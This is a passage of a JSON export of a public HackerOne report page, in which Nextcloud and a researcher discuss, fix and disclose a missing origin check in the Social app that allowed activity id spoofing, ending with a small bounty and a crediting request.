TyEe9Q6J6l3ZXKJZ8Jv02FW7RtNRHdPm0L6O0I3vOQbn8GiBG%2FkhDZRW3AOAiJuB4Bhd6Ns7j3YXA9nKlctO1uYmAj%2B6nssjBtl1lKabSm0eGuk7Feh%2B9jG%2BgpNFzxS0iYgysVfwkvplnvmKgReLAD4JvjZ9sdbv66UX5MyW9gDVXf0wfna3MN2Fqv8FOusBFyKfufPYQYGFwO4tvl1lihdDkLnCZcRwmXrB0gYZzbAneLC1UJ9NimBCebx3LEek%2BJ0J1MdqCNRGrLEY92gh38wj7A61ZNLFh9KTVAiyEFWLju0gH5kr3ndnXguXCxD19p54ZTSuYzlTQ9ArEyfvPBo%2F%2BWy25KkCTRlm376pduEzwhG4%2FgpY13ZbeNcDXcGVf2lvpy33oGJqXFcfCgWJYbDCm0M%2FBGBrkOhnizXl7hE2kfO2aQgP2N8b5LucE1O2Tl%2B%2B7ABCWc7Sl7RPhipBfTbyd%2FEfgt9ObkPFxAc0xnS36iwoGt1oKkhotg%3D%3D\u0026X-Amz-Signature=39ec79a0d8563bce32a007ebd3a730161904db35cc0cc99adce36dac7a3e55b6","file_size":53538,"type":"image/png"}],"allow_singular_disclosure_at":"2019-03-03T08:51:44.251Z","allow_singular_disclosure_after":-57618586.20909316,"singular_disclosure_allowed":true,"vote_count":12,"voters":["foobar7","mygf","asad0x01_","an0nym0us","khizer47","cyberunit","codeanddecode","cryptographer","b73772bded7541989b54f6a","r00stuff","and 2 more..."],"structured_scope":{"databaseId":13,"asset_type":"SOURCE_CODE","asset_identifier":"nextcloud/server","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":3813661,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks a lot for reporting this potential issue back to us!\n\nOur security team will take a look at this issue as soon as possible. We will reply to your report within 72 hours, usually much faster. For obvious reasons we'd like to ask you to not disclose this issue to any other party.","markdown_message":"\u003cp\u003eThanks a lot for reporting this potential issue back to us!\u003c/p\u003e\n\n\u003cp\u003eOur security team will take a look at this issue as soon as possible. We will reply to your report within 72 hours, usually much faster. For obvious reasons we\u0026#39;d like to ask you to not disclose this issue to any other party.\u003c/p\u003e\n","automated_response":true,"created_at":"2018-12-12T15:31:48.635Z","updated_at":"2018-12-12T15:31:48.635Z","actor":{"url":"/nextcloud","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Nextcloud"}},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3815743,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2018-12-12T22:05:18.861Z","updated_at":"2018-12-12T22:05:18.861Z","actor":{"username":"cult","cleared":false,"url":"/cult","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3815783,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello,\n\nFirst, I want to thank you for reviewing my code! (and you're not wasting my time)\n\nNow, about this issue, I am aware that few spots are not well protected like CSRF and Origin checking, and I planned on having a deeper look into this for 0.2.0.\nHowever, this is an interesting way of exploiting a missing origin check, and I thank you again for your report as I could have missed it.\n\nI will see to fix this for 0.1.1 'cause earlier is better.\n\nRegards,","markdown_message":"\u003cp\u003eHello,\u003c/p\u003e\n\n\u003cp\u003eFirst, I want to thank you for reviewing my code! (and you\u0026#39;re not wasting my time)\u003c/p\u003e\n\n\u003cp\u003eNow, about this issue, I am aware that few spots are not well protected like CSRF and Origin checking, and I planned on having a deeper look into this for 0.2.0.\u003cbr\u003e\nHowever, this is an interesting way of exploiting a missing origin check, and I thank you again for your report as I could have missed it.\u003c/p\u003e\n\n\u003cp\u003eI will see to fix this for 0.1.1 \u0026#39;cause earlier is better.\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-12T22:20:08.692Z","updated_at":"2018-12-12T22:20:08.692Z","actor":{"username":"cult","cleared":false,"url":"/cult","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3816052,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2018-12-12T23:19:30.639Z","updated_at":"2018-12-12T23:19:30.639Z","actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3816147,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sounds like a plan! Thanks for looking into it so quickly.","markdown_message":"\u003cp\u003eSounds like a plan! Thanks for looking into it so quickly.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-13T00:12:27.310Z","updated_at":"2018-12-13T00:12:27.310Z","actor":{"username":"tomk","cleared":false,"url":"/tomk","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3879851,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I installed the new 0.1.1 release today and confirmed that this attack is no longer viable. Spoofing the id field now throws a 500 with InvalidOriginException, and I can see the origin check in the code. Good stuff.","markdown_message":"\u003cp\u003eI installed the new 0.1.1 release today and confirmed that this attack is no longer viable. Spoofing the id field now throws a 500 with InvalidOriginException, and I can see the origin check in the code. Good stuff.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-21T23:15:36.881Z","updated_at":"2018-12-21T23:15:36.881Z","actor":{"username":"tomk","cleared":false,"url":"/tomk","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3886065,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello tomk,\n\nLast release of Social app (v0.1.1) should fix your spoofing attack.\nThanks again for your report !\n\nMerry Christmas,\n\nMaxence\n\n","markdown_message":"\u003cp\u003eHello tomk,\u003c/p\u003e\n\n\u003cp\u003eLast release of Social app (v0.1.1) should fix your spoofing attack.\u003cbr\u003e\nThanks again for your report !\u003c/p\u003e\n\n\u003cp\u003eMerry Christmas,\u003c/p\u003e\n\n\u003cp\u003eMaxence\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-24T10:40:24.720Z","updated_at":"2018-12-24T10:40:24.720Z","actor":{"username":"cult","cleared":false,"url":"/cult","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3890906,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Well, holidays and Christmas made me miss your last message.\n\nHope to meet you at a Nextcloud event. Beers on me.","markdown_message":"\u003cp\u003eWell, holidays and Christmas made me miss your last message.\u003c/p\u003e\n\n\u003cp\u003eHope to meet you at a Nextcloud event. Beers on me.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-26T10:28:59.696Z","updated_at":"2018-12-26T10:28:59.696Z","actor":{"username":"cult","cleared":false,"url":"/cult","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3895889,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"No worries! I'm at the wrong end of the planet for now but we'll see. :)","markdown_message":"\u003cp\u003eNo worries! I\u0026#39;m at the wrong end of the planet for now but we\u0026#39;ll see. :)\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-27T11:33:33.082Z","updated_at":"2018-12-27T11:33:33.082Z","actor":{"username":"tomk","cleared":false,"url":"/tomk","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4075876,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Would anyone at the NC end like to resolve and/or disclose this? It was fixed three releases ago. :)","markdown_message":"\u003cp\u003eWould anyone at the NC end like to resolve and/or disclose this? It was fixed three releases ago. :)\u003c/p\u003e\n","automated_response":false,"created_at":"2019-02-01T05:46:23.409Z","updated_at":"2019-02-01T05:46:23.409Z","actor":{"username":"tomk","cleared":false,"url":"/tomk","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4076873,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks a lot for your report again.","markdown_message":"\u003cp\u003eThanks a lot for your report again.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-02-01T08:50:06.125Z","updated_at":"2019-02-01T08:50:06.125Z","actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"tomk","url":"/tomk"},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4076881,"is_internal":false,"editable":false,"type":"Activities::SwagAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2019-02-01T08:50:14.167Z","updated_at":"2019-02-01T08:50:14.167Z","actor":{"url":"/nextcloud","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Nextcloud"}},"reporter":{"username":"tomk","url":"/tomk"},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4076895,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-02-01T08:51:43.957Z","updated_at":"2019-02-01T08:51:43.957Z","first_to_agree":true,"actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4077070,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-02-01T08:57:05.366Z","updated_at":"2019-02-01T08:57:05.366Z","actor":{"username":"tomk","cleared":false,"url":"/tomk","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4077071,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-02-01T08:57:05.427Z","updated_at":"2019-02-01T08:57:05.427Z","actor":{"username":"tomk","cleared":false,"url":"/tomk","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4077540,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"The social app is out of scope for monetary awards, however we still give you the minimum because of the level of the attack vector you found.","markdown_message":"\u003cp\u003eThe social app is out of scope for monetary awards, however we still give you the minimum because of the level of the attack vector you found.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-02-01T09:24:16.463Z","updated_at":"2019-02-01T09:24:16.463Z","actor":{"url":"/nextcloud","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Nextcloud"}},"bounty_amount":"50.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"nextcloud","collaborator":{"username":"tomk","url":"/tomk"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4077553,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Please let us know how you'd like to be credited in our official advisory. We require the following information:\n\n- Name / Pseudonym\n- Email address (optional)\n- Website (optional)\n- Company (optional)\n","markdown_message":"\u003cp\u003ePlease let us know how you\u0026#39;d like to be credited in our official advisory. We require the following information:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eName / Pseudonym\u003c/li\u003e\n\u003cli\u003eEmail address (optional)\u003c/li\u003e\n\u003cli\u003eWebsite (optional)\u003c/li\u003e\n\u003cli\u003eCompany (optional)\u003c/li\u003e\n\u003c/ul\u003e\n","automated_response":false,"created_at":"2019-02-01T09:26:35.973Z","updated_at":"2019-02-01T09:26:35.973Z","actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4077567,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks very much for the out-of-scope bounty! Just my name \"Thomas Karpiniec\" is fine for any crediting.","markdown_message":"\u003cp\u003eThanks very much for the out-of-scope bounty! Just my name \u0026quot;Thomas Karpiniec\u0026quot; is fine for any crediting.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-02-01T09:30:53.497Z","updated_at":"2019-02-01T09:30:53.497Z","actor":{"username":"tomk","cleared":false,"url":"/tomk","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}